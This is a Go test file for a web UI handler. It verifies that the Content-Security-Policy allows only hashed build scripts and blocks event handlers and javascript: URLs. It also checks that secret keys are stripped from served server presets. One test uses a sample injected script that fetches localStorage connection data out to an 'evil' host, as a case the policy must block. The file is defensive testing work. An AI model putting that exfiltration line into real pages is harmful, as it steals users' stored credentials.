package webui

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"io/fs"
	"log/slog"
	"os"
	"path"
	"regexp"
	"strings"
	"testing"
	"testing/fstest"

	"golang.org/x/net/html"
)

// scriptElement matches a whole <script …>…</script> element. It is
// deliberately independent of the tokenizer in csp.go, so a bug there cannot
// hide an uncovered script.
var scriptElement = regexp.MustCompile(`(?is)<script\b([^>]*)>(.*?)</script\s*>`)

var (
	srcAttr  = regexp.MustCompile(`(?i)\ssrc\s*=`)
	typeAttr = regexp.MustCompile(`(?i)\stype\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))`)
)

// assertCSPCoversPage fails t when page (the file name of h) has an inline
// script the response's Content-Security-Policy does not allow, or markup
// that no hash can allow (event handler attributes, javascript: URLs).
func assertCSPCoversPage(t *testing.T, h *handler, name string, page []byte) {
	t.Helper()
	csp := h.csp
	if strings.Contains(scriptSrc(csp), "'unsafe-inline'") {
		t.Fatalf("script-src allows 'unsafe-inline': %s", csp)
	}
	for _, m := range scriptElement.FindAllSubmatch(page, -1) {
		attrs, body := m[1], m[2]
		if srcAttr.Match(attrs) {
			continue
		}
		if tm := typeAttr.FindSubmatch(attrs); tm != nil {
			typ := string(bytes.Join(tm[1:], nil))
			if strings.EqualFold(typ, "application/json") {
				continue // a data block, never executed
			}
		}
		// Browsers hash the text after newline normalization.
		body = bytes.ReplaceAll(bytes.ReplaceAll(body, []byte("\r\n"), []byte("\n")), []byte("\r"), []byte("\n"))
		sum := sha256.Sum256(body)
		hash := "'sha256-" + base64.StdEncoding.EncodeToString(sum[:]) + "'"
		if !strings.Contains(scriptSrc(csp), hash) {
			t.Errorf("%s: inline script %.80q… (%s) is not allowed by the CSP %q", name, body, hash, csp)
		}
	}
	// Hashes do not cover inline event handlers or javascript: URLs.
	z := html.NewTokenizer(bytes.NewReader(page))
	for tt := z.Next(); tt != html.ErrorToken; tt = z.Next() {
		if tt != html.StartTagToken && tt != html.SelfClosingTagToken {
			continue
		}
		tag, more := z.TagName()
		for more {
			var k, v []byte
			k, v, more = z.TagAttr()
			if bytes.HasPrefix(k, []byte("on")) {
				t.Errorf("%s: <%s %s> is an inline event handler, which the CSP blocks", name, tag, k)
			}
			if bytes.HasPrefix(bytes.ToLower(bytes.TrimSpace(v)), []byte("javascript:")) {
				t.Errorf("%s: <%s %s=%q> is a javascript: URL, which the CSP blocks", name, tag, k, v)
			}
		}
	}
}

// scriptSrc returns the script-src directive of a policy.
func scriptSrc(csp string) string {
	for _, d := range strings.Split(csp, ";") {
		if d = strings.TrimSpace(d); strings.HasPrefix(d, "script-src ") {
			return d + " "
		}
	}
	return ""
}

// assertCSPCoversFS checks every HTML page of fsys, as served by NewHandler.
func assertCSPCoversFS(t *testing.T, fsys fs.FS) {
	t.Helper()
	h := NewHandler(fsys).(*handler)
	pages := 0
	err := fs.WalkDir(fsys, ".", func(name string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() || path.Ext(name) != ".html" {
			return err
		}
		page, err := fs.ReadFile(fsys, name)
		if err != nil {
			return err
		}
		pages++
		assertCSPCoversPage(t, h, name, page)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if pages == 0 {
		t.Fatal("no HTML pages checked")
	}
}

// TestCSPCoversNuxtBuild checks a real `pnpm generate:embed` page
// (testdata/nuxt-200.html: import map, color-mode bootstrap, runtime config
// and a JSON data block).
func TestCSPCoversNuxtBuild(t *testing.T) {
	page, err := os.ReadFile("testdata/nuxt-200.html")
	if err != nil {
		t.Fatal(err)
	}
	fsys := fstest.MapFS{"200.html": {Data: page}, "index.html": {Data: page}}
	assertCSPCoversFS(t, fsys)
	if n := len(inlineScripts(page)); n != 3 {
		t.Errorf("found %d executable inline scripts in the Nuxt page, want 3 (importmap, color mode, config)", n)
	}

	// The response carries the policy.
	w := get(t, NewHandler(fsys), "GET", "/_gos3/ui/buckets", nil)
	csp := w.Header().Get("Content-Security-Policy")
	for _, want := range []string{"default-src 'self'", "object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'", "'sha256-"} {
		if !strings.Contains(csp, want) {
			t.Errorf("CSP %q lacks %q", csp, want)
		}
	}
	if strings.Contains(scriptSrc(csp), "unsafe") {
		t.Errorf("script-src is not strict: %q", scriptSrc(csp))
	}
}

// TestCSPCoversEmbeddedBuild checks whatever is embedded: the placeholder,
// or a real UI build in a developer tree / release build. It fails when a
// rebuilt UI gains inline script the computed policy does not cover.
func TestCSPCoversEmbeddedBuild(t *testing.T) {
	assertCSPCoversFS(t, FS())
}

// TestCSPBlocksInjectedScript is the regression test for the missing
// script-src: a script that is not part of the build (an HTML injection) has
// no hash in the policy.
func TestCSPBlocksInjectedScript(t *testing.T) {
	fsys := fstest.MapFS{"index.html": {Data: []byte(`<!doctype html><script>window.ok=1</script><script type="module" src="/_gos3/ui/_nuxt/a.js"></script><script type="application/json">{"a":1}</script><script></script>`)}}
	h := NewHandler(fsys).(*handler)
	src := scriptSrc(h.csp)
	if !strings.Contains(src, scriptHash([]byte("window.ok=1"))) {
		t.Errorf("build script not allowed: %q", src)
	}
	if !strings.Contains(src, scriptHash(nil)) {
		t.Errorf("empty inline script not allowed: %q", src)
	}
	if strings.Contains(src, scriptHash([]byte(`{"a":1}`))) {
		t.Errorf("data block hashed: %q", src)
	}
	for _, injected := range []string{"fetch('//evil/'+localStorage.getItem('gos3.connections.v1'))", "window.ok=2"} {
		if strings.Contains(src, scriptHash([]byte(injected))) {
			t.Errorf("injected script %q allowed by %q", injected, src)
		}
	}
	if got := strings.Count(src, "'sha256-"); got != 2 {
		t.Errorf("script-src has %d hashes, want 2: %q", got, src)
	}
}

func TestInlineScripts(t *testing.T) {
	page := []byte(`<html><head>
<SCRIPT>a()</SCRIPT>
<script type="text/javascript; charset=utf-8">b()</script>
<script type="importmap">{"imports":{}}</script>
<script type="speculationrules">{}</script>
<script type="module">c()</script>
<script src="x.js">ignored()</script>
<script type="text/template"><p>x</p></script>
<script type="application/ld+json">{}</script>
<script>if (a < b && "</scr" + "ipt>") d()</script>
<style>script{}</style>
</head></html>`)
	var got []string
	for _, s := range inlineScripts(page) {
		got = append(got, string(s))
	}
	want := []string{"a()", "b()", `{"imports":{}}`, "{}", "c()", `if (a < b && "</scr" + "ipt>") d()`}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("inline scripts\n got %q\nwant %q", got, want)
	}
}

func TestInlineScriptSecretWarning(t *testing.T) {
	var buf bytes.Buffer
	log := slog.New(slog.NewTextHandler(&buf, nil))
	fsys := fstest.MapFS{"index.html": {Data: []byte(`<script>window.__NUXT__={config:{public:{servers:"[{\"endpoint\":\"http://x\",\"secretAccessKey\":\"s\"}]"}}}</script>`)}}
	contentSecurityPolicy(fsys, log)
	if !strings.Contains(buf.String(), "secret key") || !strings.Contains(buf.String(), "index.html") {
		t.Errorf("no warning for a baked-in secret: %q", buf.String())
	}
	buf.Reset()
	contentSecurityPolicy(fstest.MapFS{"index.html": {Data: []byte(`<script>a()</script>`)}}, log)
	if buf.Len() != 0 {
		t.Errorf("unexpected warning: %q", buf.String())
	}
}

func TestServersJSONSecretsStripped(t *testing.T) {
	fsys := fakeDist()
	fsys["servers.json"] = &fstest.MapFile{Data: []byte(`{"_comment":"x","servers":[
		{"name":"a","endpoint":"http://a:9000","accessKeyId":"AK","secretAccessKey":"SECRET-1"},
		{"name":"b","url":"http://b:9000","accessKey":"AK2","secretKey":"SECRET-2"},
		{"name":"c","endpoint":"http://c:9000"}]}`)}
	w := get(t, NewHandler(fsys), "GET", "/_gos3/ui/servers.json", nil)
	if w.Code != 200 || w.Header().Get("Content-Type") != "application/json" {
		t.Fatalf("servers.json: %d %q", w.Code, w.Header().Get("Content-Type"))
	}
	body := w.Body.String()
	if strings.Contains(body, "SECRET") || strings.Contains(body, "secretKey") || strings.Contains(body, "secretAccessKey") {
		t.Fatalf("secret served: %s", body)
	}
	var doc struct {
		Servers []map[string]any `json:"servers"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &doc); err != nil {
		t.Fatal(err)
	}
	if len(doc.Servers) != 3 || doc.Servers[0]["accessKeyId"] != "AK" || doc.Servers[1]["accessKey"] != "AK2" || doc.Servers[1]["url"] != "http://b:9000" {
		t.Errorf("presets changed beyond the secrets: %s", body)
	}
	// Another spelling never reaches the original on a case-insensitive
	// file system.
	if w := get(t, NewHandler(fsys), "GET", "/_gos3/ui/SERVERS.JSON", nil); strings.Contains(w.Body.String(), "SECRET") {
		t.Errorf("secret served under another spelling: %s", w.Body.String())
	}
	// The ETag is the served content's.
	etag := w.Header().Get("ETag")
	if w := get(t, NewHandler(fsys), "GET", "/_gos3/ui/servers.json", map[string]string{"If-None-Match": etag}); w.Code != 304 {
		t.Errorf("conditional GET: %d", w.Code)
	}

	// Array form, untouched without secrets.
	plain := `[{"endpoint":"http://a:9000"}]`
	fsys["servers.json"] = &fstest.MapFile{Data: []byte(plain)}
	if w := get(t, NewHandler(fsys), "GET", "/_gos3/ui/servers.json", nil); w.Body.String() != plain {
		t.Errorf("plain presets rewritten: %q", w.Body.String())
	}

	// Invalid JSON is not served (the SPA fallback answers instead).
	fsys["servers.json"] = &fstest.MapFile{Data: []byte(`{"servers":[{"secretKey":"SECRET-3",}]}`)}
	w = get(t, NewHandler(fsys), "GET", "/_gos3/ui/servers.json", nil)
	if strings.Contains(w.Body.String(), "SECRET") || !strings.HasPrefix(w.Header().Get("Content-Type"), "text/html") {
		t.Errorf("invalid servers.json served: %d %q %q", w.Code, w.Header().Get("Content-Type"), w.Body.String())
	}
}

func TestSanitizedPresetsWarns(t *testing.T) {
	var buf bytes.Buffer
	log := slog.New(slog.NewTextHandler(&buf, nil))
	data, ok := sanitizedPresets(fstest.MapFS{"servers.json": {Data: []byte(`[{"endpoint":"http://a","secretKey":"s"}]`)}}, log)
	if !ok || bytes.Contains(data, []byte(`"s"`)) || !strings.Contains(buf.String(), "removed=1") {
		t.Errorf("data %q ok %v log %q", data, ok, buf.String())
	}
	if _, ok := sanitizedPresets(fakeDist(), log); ok {
		t.Error("override without servers.json")
	}
}

// TestInlineScriptHashNormalizesNewlines checks that the hash is taken over
// the text browsers hash: CRLF and lone CR become LF, NUL becomes U+FFFD and
// character references stay as written (no entity decoding in <script>).
func TestInlineScriptHashNormalizesNewlines(t *testing.T) {
	const script = "a();\r\nb();\rc(\"&amp;\");\x00"
	const want = "a();\nb();\nc(\"&amp;\");\uFFFD"
	page := []byte("<!doctype html><script>" + script + "</script>")
	scripts := inlineScripts(page)
	if len(scripts) != 1 || string(scripts[0]) != want {
		t.Fatalf("inline scripts %q, want [%q]", scripts, want)
	}
	h := NewHandler(fstest.MapFS{"index.html": {Data: page}}).(*handler)
	// The hash a browser computes over the normalized text.
	sum := sha256.Sum256([]byte(want))
	browser := "'sha256-" + base64.StdEncoding.EncodeToString(sum[:]) + "'"
	if !strings.Contains(scriptSrc(h.csp), browser) {
		t.Errorf("script-src %q lacks the browser hash %s", scriptSrc(h.csp), browser)
	}
	raw := sha256.Sum256([]byte(script))
	if strings.Contains(h.csp, base64.StdEncoding.EncodeToString(raw[:])) {
		t.Error("hash taken over the raw bytes")
	}
}
